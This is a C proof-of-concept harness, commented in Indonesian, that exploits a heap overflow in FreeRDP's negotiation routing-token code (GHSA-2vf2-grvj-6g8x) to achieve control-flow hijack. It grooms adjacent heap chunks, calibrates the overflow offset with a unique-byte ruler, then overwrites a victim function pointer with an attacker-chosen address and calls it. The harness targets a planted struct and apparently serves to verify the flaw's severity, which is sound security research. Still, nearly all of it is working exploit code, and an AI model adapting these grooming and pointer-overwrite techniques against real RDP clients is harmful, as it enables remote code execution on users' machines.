/*
 * harness_chain.c — rantai: overflow `nego` (CWE-122) menjadi KENDALI ALUR EKSEKUSI.
 *
 * Kelas pada revisi rentan 993499447e32… (GHSA-2vf2-grvj-6g8x):
 *   nego_set_routing_token(nego, token, 600)   → RoutingTokenLength = 600 (dikendalikan server)
 *   nego_send_negotiation_request(nego)        → Stream_New(nullptr, 512) lalu Stream_Write(s, token, 600)
 *                                                tanpa cek kapasitas → menimpa chunk berikutnya di heap
 *
 * Rancangan: DUA LINTASAN, kalibrasi diri (jangan menebak offset heap).
 *   Lintasan 1 (kalibrasi) — token diisi "penggaris" byte unik pada token[512..599]. Setelah overflow,
 *     harness membaca payload korban dan mencari di mana penggaris itu mendarat ⇒ dapat pemetaan
 *     token-offset → posisi-di-korban yang SEBENARNYA di runner (usable chunk glibc, tcache, dst).
 *   Lintasan 2 (hijack) — offset field `fn` dihitung dari hasil kalibrasi, alamat target KANONIK
 *     ditempatkan di sana, overflow, verifikasi `B->fn == alamat pilihan`, lalu panggil.
 *     Handler SIGSEGV menilai: fault harus di alamat yang kita pilih ⇒ `pc` = pilihan penyerang.
 *
 * Wajib dibangun TANPA AddressSanitizer (ASan memasang redzone antar chunk sehingga penulisan tidak
 * akan pernah mencapai tetangga — itu memang gunanya). Bukti overflow-nya sendiri: harness_nego.c.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h>

#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <winpr/wlog.h>

#include "transport.h" /* libfreerdp/core */
#include "nego.h"      /* libfreerdp/core */

#define TOKEN_LEN 600
#define STREAM_CHUNK 512
#define CHUNK_HDR 16
/* alamat target harus KANONIK: non-kanonik → #GP → kernel melaporkan si_addr = 0, bukti jadi kabur */
#define TARGET_ADDR 0x0000414141414141ULL
#define RULER_START 512
#define RULER_LEN 88
#define PREFIX "Cookie: mstshash=poc\r\n"

typedef struct
{
	unsigned long long canary;
	void (*fn)(void);
	unsigned long long tail;
} victim_t;

static unsigned char* g_token = NULL;

static void target_fn(void)
{
	puts("  !! target_fn tercapai — seharusnya tidak pernah dieksekusi");
}

static void segv_handler(int sig, siginfo_t* si, void* ctx)
{
	(void)ctx;
	const unsigned long long want = TARGET_ADDR;
	const unsigned long long got = (unsigned long long)(uintptr_t)si->si_addr;
	char buf[320];
	int n = snprintf(buf, sizeof(buf), "  SINYAL %d: alamat fault = 0x%016llx (diinginkan 0x%016llx)\n",
	                 sig, got, want);
	if (n > 0)
		(void)!write(1, buf, (size_t)n);
	if (got == want)
	{
		const char* ok = "  HIJACK TERBUKTI: pc diarahkan ke alamat yang kita tanam di token\n"
		                 "VERDICT: TERBUKTI — overflow menjadi control-flow hijack\n";
		(void)!write(1, ok, strlen(ok));
		_exit(0);
	}
	{
		const char* no = "VERDICT: BELUM TERBUKTI — fault bukan di alamat yang kita pilih\n";
		(void)!write(1, no, strlen(no));
		_exit(1);
	}
}

/* isi token dengan penggaris: token[512+k] = k+1 (byte unik per offset) */
static void fill_ruler(void)
{
	memset(g_token, 0x41, TOKEN_LEN);
	memcpy(g_token, PREFIX, strlen(PREFIX));
	for (int k = 0; k < RULER_LEN; k++)
		g_token[RULER_START + k] = (unsigned char)(k + 1);
}

/* isi token dengan alamat target kanonik di sekitar offset `fn_off` (plus sabuk) */
static void fill_target(size_t fn_off)
{
	const unsigned long long t = TARGET_ADDR;
	memset(g_token, 0x41, TOKEN_LEN);
	memcpy(g_token, PREFIX, strlen(PREFIX));
	for (int d = -8; d <= 8; d += 8)
	{
		const long o = (long)fn_off + d;
		if (o >= 0 && (size_t)o + sizeof(t) <= TOKEN_LEN)
			memcpy(g_token + o, &t, sizeof(t));
	}
}

/* cari pasangan chunk yang BENAR-BENAR bersebelahan (heap punya lubang dari alokasi awal FreeRDP) */
static int groom(unsigned char** Aout, victim_t** Bout)
{
	for (int i = 0; i < 256; i++)
	{
		unsigned char* a = (unsigned char*)malloc(STREAM_CHUNK);
		victim_t* b = (victim_t*)malloc(STREAM_CHUNK);
		if (!a || !b)
			return -1;
		if ((long)((unsigned char*)b - a) == STREAM_CHUNK + CHUNK_HDR)
		{
			*Aout = a;
			*Bout = b;
			return i;
		}
	}
	return -1;
}

static void dump_hex(const char* label, const unsigned char* p, int n)
{
	printf("  %s", label);
	for (int i = 0; i < n; i++)
		printf("%02x ", p[i]);
	printf("\n");
}

int main(void)
{
	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = segv_handler;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);
	sigaction(SIGBUS, &sa, NULL);
	sigaction(SIGILL, &sa, NULL);

	WLog_SetLogLevel(WLog_GetRoot(), WLOG_ERROR);

	g_token = (unsigned char*)malloc(TOKEN_LEN);
	if (!g_token)
		return 3;

	freerdp* instance = freerdp_new();
	if (!instance)
		return 3;
	instance->ContextSize = sizeof(rdpContext);
	if (!freerdp_context_new(instance))
		return 3;
	rdpContext* context = instance->context;
	if (!context)
		return 3;

	printf("harness rantai — overflow nego → control-flow hijack (kalibrasi diri, 2 lintasan)\n");
	printf("  target kanonik=0x%016llx (kanonik: %s)\n", TARGET_ADDR,
	       ((TARGET_ADDR >> 47) == 0 || (TARGET_ADDR >> 47) == 0x1FFFF) ? "ya" : "TIDAK");

	/* ---------- LINTASAN 1: kalibrasi pemetaan token → memori korban ---------- */
	rdpTransport* transport = transport_new(context);
	if (!transport)
		return 3;
	rdpNego* nego = nego_new(transport);
	if (!nego)
		return 3;

	fill_ruler();
	unsigned char* A1 = NULL;
	victim_t* B1 = NULL;
	int idx1 = groom(&A1, &B1);
	if (idx1 < 0)
	{
		printf("  [x] tak menemukan pasangan bersebelahan — berhenti (tak mengklaim)\n");
		return 2;
	}
	B1->canary = 0x1111111111111111ULL;
	B1->fn = target_fn;
	B1->tail = 0x2222222222222222ULL;
	printf("  [kalibrasi] pasangan #%d A=%p B=%p selisih=%ld\n", idx1, (void*)A1, (void*)B1,
	       (long)((unsigned char*)B1 - A1));
	free(A1);
	if (!nego_set_routing_token(nego, g_token, (UINT32)TOKEN_LEN))
		return 2;
	(void)nego_send_negotiation_request(nego);

	const unsigned char* pb1 = (const unsigned char*)B1;
	dump_hex("[kalibrasi] payload korban (24 B): ", pb1, 24);
	int j = -1;
	for (int i = 0; i < 20; i++)
	{
		if (pb1[i] == 1 && pb1[i + 1] == 2)
		{
			j = i;
			break;
		}
	}
	if (j < 0)
	{
		printf("  [x] penggaris tidak tampak di payload korban — pemetaan tak bisa diukur, berhenti\n");
		return 2;
	}
	const long base = (long)RULER_START - j; /* token offset yang mendarat di B[0] */
	const size_t fn_off = (size_t)(base + 8);
	printf("  [kalibrasi] token[%ld] → B[0]  ⇒  field `fn` ⊂ token[%zu]\n", base, fn_off);
	printf("  [kalibrasi] byte target nanti di token[%zu]:", fn_off);
	fflush(stdout);

	/* ---------- LINTASAN 2: hijack memakai offset hasil kalibrasi ---------- */
	nego_free(nego);
	transport_free(transport);
	transport = transport_new(context);
	if (!transport)
		return 3;
	nego = nego_new(transport);
	if (!nego)
		return 3;

	fill_target(fn_off);
	unsigned char* A2 = NULL;
	victim_t* B2 = NULL;
	int idx2 = groom(&A2, &B2);
	if (idx2 < 0)
	{
		printf("\n  [x] grooming lintasan 2 gagal — berhenti (tak mengklaim)\n");
		return 2;
	}
	B2->canary = 0xDEADBEEFCAFEBABEULL;
	B2->fn = target_fn;
	B2->tail = 0xFEEDFACECAFED00DULL;
	printf(" 0x%02x%02x%02x%02x%02x%02x%02x%02x\n", g_token[fn_off + 7], g_token[fn_off + 6],
	       g_token[fn_off + 5], g_token[fn_off + 4], g_token[fn_off + 3], g_token[fn_off + 2],
	       g_token[fn_off + 1], g_token[fn_off]);
	printf("  [hijack] pasangan #%d A=%p B=%p selisih=%ld\n", idx2, (void*)A2, (void*)B2,
	       (long)((unsigned char*)B2 - A2));
	free(A2);
	if (!nego_set_routing_token(nego, g_token, (UINT32)TOKEN_LEN))
		return 2;
	printf("  RoutingTokenLength=%d disuntik; memanggil nego_send_negotiation_request\n", TOKEN_LEN);
	fflush(stdout);
	(void)nego_send_negotiation_request(nego);

	printf("  setelah overflow: korban canary=0x%016llx fn=0x%016llx tail=0x%016llx\n", B2->canary,
	       (unsigned long long)(uintptr_t)B2->fn, B2->tail);
	fflush(stdout);

	if (B2->fn == target_fn)
	{
		printf("  [x] pointer korban TIDAK tertimpa — tak mengklaim hijack\n");
		return 1;
	}
	if ((unsigned long long)(uintptr_t)B2->fn != TARGET_ADDR)
	{
		printf("  [!] tertimpa tapi bukan alamat pilihan kita — tak mengklaim hijack\n");
		return 1;
	}
	printf("  korban tertimpa dengan alamat pilihan kita → memanggil pointer itu\n");
	fflush(stdout);
	B2->fn();

	printf("  [x] pemanggilan kembali normal — tak ada hijack\n");
	return 1;
}
